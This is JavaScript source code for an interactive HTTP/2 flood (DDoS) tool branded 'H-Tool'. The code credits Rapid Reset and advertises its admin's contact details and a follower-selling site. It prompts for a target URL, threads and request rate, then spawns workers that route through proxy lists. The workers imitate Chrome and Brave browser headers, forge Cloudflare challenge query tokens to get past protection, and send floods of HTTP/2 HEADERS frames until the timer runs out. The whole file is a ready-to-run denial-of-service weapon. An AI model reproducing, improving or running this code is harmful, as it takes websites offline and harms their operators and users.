// made by @rapidreset aka mitigations for mesh botnet
// UI Update by H-Tool 2025 (Interactive Mode - Fixed Syntax)
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
const readline = require('readline');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

// --- KHỐI UI H-TOOL ---
const UI = {
    RESET: '\x1b[0m',
    BOLD: '\x1b[1m',
    RED: '\x1b[38;5;196m',
    GREEN: '\x1b[38;5;46m',
    YELLOW: '\x1b[38;5;226m',
    BLUE: '\x1b[38;5;39m',
    PURPLE: '\x1b[38;5;135m',
    CYAN: '\x1b[38;5;51m',
    ORANGE: '\x1b[38;5;208m',
    WHITE: '\x1b[38;5;255m',
    GREY: '\x1b[38;5;240m',

    getRandomColorScheme: function() {
        const colorSchemes = [
            ['\x1b[38;5;33m', '\x1b[38;5;39m', '\x1b[38;5;45m', '\x1b[38;5;51m'],
            ['\x1b[38;5;196m', '\x1b[38;5;202m', '\x1b[38;5;208m', '\x1b[38;5;214m'],
            ['\x1b[38;5;46m', '\x1b[38;5;82m', '\x1b[38;5;118m', '\x1b[38;5;154m']
        ];
        return colorSchemes[Math.floor(Math.random() * colorSchemes.length)];
    },

    banner: function() {
        if (os.platform() === 'win32') {
            exec('cls');
        } else {
            console.clear();
        }

        const colors = this.getRandomColorScheme();
        const logo = `
${colors[0]}██╗  ██╗      ${colors[1]}████████╗ ██████╗  ██████╗ ██╗     
${colors[0]}██║  ██║      ${colors[1]}╚══██╔══╝██╔═══██╗██╔═══██╗██║     
${colors[1]}███████║█████╗${colors[2]}   ██║   ██║   ██║██║   ██║██║     
${colors[2]}██╔══██║╚════╝${colors[3]}   ██║   ██║   ██║██║   ██║██║     
${colors[2]}██║  ██║      ${colors[3]}   ██║   ╚██████╔╝╚██████╔╝███████╗
${colors[3]}╚═╝  ╚═╝         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝${this.RESET}`;

        console.log(logo);
        const copyrightColors = ['\x1b[38;5;220m', '\x1b[38;5;226m', '\x1b[38;5;214m', '\x1b[38;5;208m'];
        const cpColor = copyrightColors[Math.floor(Math.random() * copyrightColors.length)];
        console.log(`${cpColor}                Copyright © H-Tool 2025 | Version 1.0${this.RESET}\n`);

        const infoColors = {
            prompt: '\x1b[38;5;46m',
            label: '\x1b[38;5;51m',
            name: '\x1b[38;5;159m',
            website: '\x1b[38;5;214m',
            phone: '\x1b[38;5;196m',
            link: '\x1b[38;5;141m'
        };

        console.log(`${infoColors.prompt}~[●] ➤ ${infoColors.label}Admin: ${infoColors.name}Trần Văn Quang Huy${this.RESET}`);
        console.log(`${infoColors.prompt}~[●] ➤ ${infoColors.label}Website Bán Sub Giá Rẻ: ${infoColors.website}Follow1S.Net${this.RESET}`);
        console.log(`${infoColors.prompt}~[●] ➤ ${infoColors.label}Zalo Admin: ${infoColors.phone}0372065607${this.RESET}`);
        console.log(`${infoColors.prompt}~[●] ➤ ${infoColors.label}Box Zalo: ${infoColors.link}https://zalo.me/g/dqacsy523${this.RESET}\n`);
    }
};

function askQuestion(query) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });
    return new Promise(resolve => rl.question(query, ans => {
        rl.close();
        resolve(ans);
    }));
}

// --- LOGIC CHÍNH ---

if (cluster.isMaster) {
    (async () => {
        UI.banner();
        console.log(`${UI.YELLOW}--- SETUP ATTACK CONFIGURATION ---${UI.RESET}\n`);

        const reqmethod = await askQuestion(`${UI.CYAN}Nhập phương thức (GET/POST...): ${UI.RESET}`);
        const target = await askQuestion(`${UI.CYAN}Nhập URL mục tiêu: ${UI.RESET}`);
        const time = await askQuestion(`${UI.CYAN}Nhập thời gian (giây): ${UI.RESET}`);
        const threads = await askQuestion(`${UI.CYAN}Nhập số luồng (Threads): ${UI.RESET}`);
        const ratelimit = await askQuestion(`${UI.CYAN}Nhập Rate Limit (Requests/s): ${UI.RESET}`);
        const proxyfile = await askQuestion(`${UI.CYAN}Nhập file Proxy (Enter để dùng 'proxy.txt'): ${UI.RESET}`) || 'proxy.txt';

        if (!reqmethod || !target || !time || !threads || !ratelimit) {
            console.log(`\n${UI.RED}❌ Vui lòng nhập đầy đủ thông tin!${UI.RESET}`);
            process.exit(1);
        }

        UI.banner();
        console.log(`${UI.YELLOW}--- SYSTEM ATTACK STARTED ---${UI.RESET}`);
        console.log(`${UI.GREEN}~[+] > ${UI.CYAN}Target    : ${UI.WHITE}${target}`);
        console.log(`${UI.GREEN}~[+] > ${UI.CYAN}Method    : ${UI.WHITE}${reqmethod}`);
        console.log(`${UI.GREEN}~[+] > ${UI.CYAN}Threads   : ${UI.WHITE}${threads}`);
        console.log(`${UI.GREEN}~[+] > ${UI.CYAN}Time      : ${UI.WHITE}${time}s`);
        console.log(`${UI.GREEN}~[+] > ${UI.CYAN}Rate      : ${UI.WHITE}${ratelimit}/s`);
        console.log(`${UI.GREEN}~[+] > ${UI.CYAN}Proxy     : ${UI.WHITE}${proxyfile}`);
        console.log(`\n${UI.ORANGE}Attack Started Successfully! Waiting for results...${UI.RESET}\n`);

        for (let i = 0; i < threads; i++) {
            cluster.fork({
                REQ_METHOD: reqmethod,
                TARGET: target,
                TIME: time,
                THREADS: threads,
                RATE_LIMIT: ratelimit,
                PROXY_FILE: proxyfile
            });
        }

        setTimeout(() => process.exit(1), time * 1000);
        setInterval(TCP_CHANGES_SERVER, 5000);

    })();

} else {
    // --- WORKER PROCESS ---
    const reqmethod = process.env.REQ_METHOD;
    const target = process.env.TARGET;
    const time = parseInt(process.env.TIME);
    const threads = parseInt(process.env.THREADS);
    const ratelimit = parseInt(process.env.RATE_LIMIT);
    const proxyfile = process.env.PROXY_FILE;

    const query = '1'; 
    const bfmFlag = undefined;
    const delay = 1;
    const cookieValue = undefined;
    const refererValue = undefined;
    const postdata = undefined;
    const randrate = undefined;
    const customHeaders = undefined;
    const customIP = undefined;
    const customUA = undefined;
    const forceHttp = "2";
    const debugMode = false;
    const useLegitHeaders = true;

    let hcookie = '';
    const url = new URL(target);
    const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');

    let custom_table = 65535;
    let custom_window = 6291456;
    let custom_header = 262144;
    let custom_update = 15663105;

    const timestamp = Date.now();
    const timestampString = timestamp.toString().substring(0, 10);
    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

    if (cookieValue) {
        hcookie = cookieValue;
    }

    function encodeFrame(streamId, type, payload = "", flags = 0) {
        let frame = Buffer.alloc(9);
        frame.writeUInt32BE(payload.length << 8 | type, 0);
        frame.writeUInt8(flags, 4);
        frame.writeUInt32BE(streamId, 5);
        if (payload.length > 0)
            frame = Buffer.concat([frame, payload]);
        return frame;
    }

    function decodeFrame(data) {
        const lengthAndType = data.readUInt32BE(0);
        const length = lengthAndType >> 8;
        const type = lengthAndType & 0xFF;
        const flags = data.readUint8(4);
        const streamId = data.readUInt32BE(5);
        const offset = flags & 0x20 ? 5 : 0;

        let payload = Buffer.alloc(0);

        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length);
            if (payload.length + offset != length) {
                return null;
            }
        }

        return {
            streamId,
            length,
            type,
            flags,
            payload
        };
    }

    function encodeSettings(settings) {
        const data = Buffer.alloc(6 * settings.length);
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6);
            data.writeUInt32BE(settings[i][1], i * 6 + 2);
        }
        return data;
    }

    function encodeRstStream(streamId, type, flags) {
        const frameHeader = Buffer.alloc(9);
        frameHeader.writeUInt32BE(4, 0);
        frameHeader.writeUInt8(type, 4);
        frameHeader.writeUInt8(flags, 5);
        frameHeader.writeUInt32BE(streamId, 5);
        const statusCode = Buffer.alloc(4).fill(0);
        return Buffer.concat([frameHeader, statusCode]);
    }

    const getRandomChar = () => {
        const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
        const randomIndex = Math.floor(Math.random() * pizda4.length);
        return pizda4[randomIndex];
    };

    function randstr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    function randstrr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        let result = '';
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters[randomIndex];
        }
        return result;
    }

    function ememmmmmemmeme(minLength, maxLength) {
        const characters = 'abcdefghijklmnopqrstuvwxyz';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        let result = '';
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters[randomIndex];
        }
        return result;
    }

    function getRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function buildRequest() {
        const browserVersion = getRandomInt(120, 123);
        const fwfw = ['Google Chrome', 'Brave'];
        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

        let brandValue;
        if (browserVersion === 120) {
            brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
        } else if (browserVersion === 121) {
            brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
        } else if (browserVersion === 122) {
            brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
        } else if (browserVersion === 123) {
            brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
        }

        const isBrave = wfwf === 'Brave';
        const acceptHeaderValue = isBrave
            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

        const langValue = isBrave ? 'en-US,en;q=0.6' : 'en-US,en;q=0.7';
        const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
        const secChUa = `${brandValue}`;
        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

        let mysor = '\r\n';
        let mysor1 = '\r\n';
        if (hcookie || currentRefererValue) {
            mysor = '\r\n';
            mysor1 = '';
        } else {
            mysor = '';
            mysor1 = '\r\n';
        }

        let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
            `Accept: ${acceptHeaderValue}\r\n` +
            'Accept-Encoding: gzip, deflate, br\r\n' +
            `Accept-Language: ${langValue}\r\n` +
            'Cache-Control: max-age=0\r\n' +
            'Connection: Keep-Alive\r\n' +
            `Host: ${url.hostname}\r\n` +
            'Sec-Fetch-Dest: document\r\n' +
            'Sec-Fetch-Mode: navigate\r\n' +
            'Sec-Fetch-Site: none\r\n' +
            'Sec-Fetch-User: ?1\r\n' +
            'Upgrade-Insecure-Requests: 1\r\n' +
            `User-Agent: ${userAgent}\r\n` +
            `sec-ch-ua: ${secChUa}\r\n` +
            'sec-ch-ua-mobile: ?0\r\n' +
            'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

        if (hcookie) {
            headers += `Cookie: ${hcookie}\r\n`;
        }

        if (currentRefererValue) {
            headers += `Referer: ${currentRefererValue}\r\n` + mysor;
        }

        const mmm = Buffer.from(`${headers}`, 'binary');
        return mmm;
    }

    const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()));

    function go() {
        var [proxyHost, proxyPort] = '1.1.1.1:3128';

        if(customIP) {
            [proxyHost, proxyPort] = customIP.split(':');
        } else {
            [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
        }

        let tlsSocket;

        if (!proxyPort || isNaN(proxyPort)) {
            go();
            return;
        }

        const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
            netSocket.once('data', () => {
                tlsSocket = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                    secure: true,
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    rejectUnauthorized: false
                }, () => {
                    if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                        if (forceHttp == 2) {
                            tlsSocket.end(() => tlsSocket.destroy());
                            return;
                        }
                        function doWrite() {
                            tlsSocket.write(http1Payload, (err) => {
                                if (!err) {
                                    setTimeout(() => {
                                        doWrite();
                                    }, 1000 / ratelimit);
                                } else {
                                    tlsSocket.end(() => tlsSocket.destroy());
                                }
                            });
                        }
                        doWrite();
                        tlsSocket.on('error', () => {
                            tlsSocket.end(() => tlsSocket.destroy());
                        });
                        return;
                    }

                    if (forceHttp == 1) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    let streamId = 1;
                    let data = Buffer.alloc(0);
                    let hpack = new HPACK();
                    hpack.setTableSize(4096);

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(custom_update, 0);

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, custom_header],
                            [2, 0],
                            [4, custom_window],
                            [6, custom_table]
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    tlsSocket.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData]);
                        while (data.length >= 9) {
                            const frame = decodeFrame(data);
                            if (frame != null) {
                                data = data.subarray(frame.length + 9);
                                if (frame.type == 4 && frame.flags == 0) {
                                    tlsSocket.write(encodeFrame(0, 4, "", 1));
                                }
                                if (frame.type == 7 || frame.type == 5) {
                                    tlsSocket.write(encodeRstStream(0, 3, 0));
                                    tlsSocket.end(() => tlsSocket.destroy());
                                }
                            } else {
                                break;
                            }
                        }
                    });

                    tlsSocket.write(Buffer.concat(frames));

                    function doWrite() {
                        if (tlsSocket.destroyed) {
                            return;
                        }

                        const requests = [];

                        for (let i = 0; i < ratelimit; i++) {
                            const browserVersion = getRandomInt(120, 123);
                            const fwfw = ['Google Chrome', 'Brave'];
                            const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                            const ref = ["same-site", "same-origin", "cross-site"];
                            const ref1 = ref[Math.floor(Math.random() * ref.length)];

                            let brandValue;
                            if (browserVersion === 120) {
                                brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                            } else if (browserVersion === 121) {
                                brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                            } else if (browserVersion === 122) {
                                brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                            } else if (browserVersion === 123) {
                                brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                            }

                            const isBrave = wfwf === 'Brave';
                            const acceptHeaderValue = isBrave
                                ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                                : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                            const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
                            const secGpcValue = isBrave ? "1" : undefined;
                            const secChUaModel = isBrave ? '""' : undefined;
                            const secChUaPlatform = isBrave ? 'Windows' : undefined;
                            const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                            const secChUaMobile = isBrave ? '?0' : undefined;

                            var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;

                            if(customUA) {
                                userAgent = customUA;
                            }

                            const secChUa = `${brandValue}`;
                            const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

                            function handleQuery(query) {
                                if (query === '1') {
                                    return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                                } else if (query === '2') {
                                    return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                                } else if (query === '3') {
                                    return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                                } else {
                                    return url.pathname;
                                }
                            }

                            // --- FIXED HEADER OBJECT SYNTAX ---
                            const headerObj = {
                                ":method": reqmethod,
                                ":authority": url.hostname,
                                ":scheme": "https",
                                ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                            };

                            const headerOptions = {
                                "sec-ch-ua": secChUa,
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": `\"Windows\"`,
                                "upgrade-insecure-requests": "1",
                                "user-agent": userAgent,
                                "accept": acceptHeaderValue,
                                "accept-encoding": "gzip, deflate, br",
                                "accept-language": langValue
                            };

                            // Merge standard headers
                            if (Math.random() < 0.4) headerOptions["cache-control"] = "max-age=0";
                            if (reqmethod === "POST") headerOptions["content-length"] = "0";
                            if (secGpcValue) headerOptions["sec-gpc"] = secGpcValue;
                            if (secChUaMobile) headerOptions["sec-ch-ua-mobile"] = secChUaMobile;
                            if (secChUaModel) headerOptions["sec-ch-ua-model"] = secChUaModel;
                            if (secChUaPlatform) headerOptions["sec-ch-ua-platform"] = secChUaPlatform;
                            if (secChUaPlatformVersion) headerOptions["sec-ch-ua-platform-version"] = secChUaPlatformVersion;

                            if (Math.random() < 0.5) {
                                headerOptions["sec-fetch-site"] = currentRefererValue ? ref1 : "none";
                                headerOptions["sec-fetch-mode"] = "navigate";
                                headerOptions["sec-fetch-user"] = "?1";
                                headerOptions["sec-fetch-dest"] = "document";
                            }

                            if (hcookie) headerOptions["cookie"] = hcookie;
                            if (currentRefererValue) headerOptions["referer"] = currentRefererValue;

                            const headers = Object.entries(headerObj).concat(Object.entries(headerOptions));

                            const headers3 = Object.entries(headerObj).concat(Object.entries({
                                ...headerOptions,
                                "sec-fetch-site": currentRefererValue ? ref1 : "none",
                                "sec-fetch-mode": "navigate",
                                "sec-fetch-user": "?1",
                                "sec-fetch-dest": "document"
                            }));

                            // Random headers
                            const headers2 = [];
                            if (Math.random() < 0.3) headers2.push([`x-client-session${getRandomChar()}`, `none${getRandomChar()}`]);
                            if (Math.random() < 0.3) headers2.push([`sec-ms-gec-version${getRandomChar()}`, `undefined${getRandomChar()}`]);
                            if (Math.random() < 0.3) headers2.push([`sec-fetch-users${getRandomChar()}`, `?0${getRandomChar()}`]);
                            if (Math.random() < 0.3) headers2.push([`x-request-data${getRandomChar()}`, `dynamic${getRandomChar()}`]);

                            const combinedHeaders = useLegitHeaders ? headers3 : headers.concat(headers2);

                            const packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(combinedHeaders)
                            ]);

                            requests.push(encodeFrame(streamId, 1, packed, 0x25));
                            streamId += 2;
                        }

                        tlsSocket.write(Buffer.concat(requests), (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite();
                                }, 1000 / ratelimit);
                            }
                        });
                    }

                    doWrite();
                }).on('error', () => {
                    tlsSocket.destroy();
                });
            });

            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        }).once('error', () => { }).once('close', () => {
            if (tlsSocket) {
                tlsSocket.end(() => { tlsSocket.destroy(); go(); });
            }
        });
    }

    let conns = 0;
    let i = setInterval(() => {
        if (conns < 30000) {
            conns++;
        } else {
            clearInterval(i);
            return;
        }
        go();
    }, delay);

    setTimeout(() => process.exit(1), time * 1000);
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

setInterval(() => {
    // Timer logic
}, 1000);

let timer = 0;
setInterval(() => {
    if (timer <= 10) {
        timer++;
    } else {
        timer = 0;
    }
}, 10000);
